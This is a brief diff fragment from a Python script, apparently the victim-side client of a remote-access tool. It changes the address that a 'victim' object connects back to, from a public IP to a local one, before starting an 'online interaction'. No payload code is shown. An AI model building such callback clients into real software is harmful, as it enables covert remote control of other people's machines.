@@ -141,7 +141,7 @@ def Init():
 
 def main():
     choice = "online"  # "offline"
-    victim = Vic('173.230.140.32', 999)
+    victim = Vic('192.168.1.177', 8000)
     victim.connect_to_server()
     if choice == "online":
         victim.online_interaction()
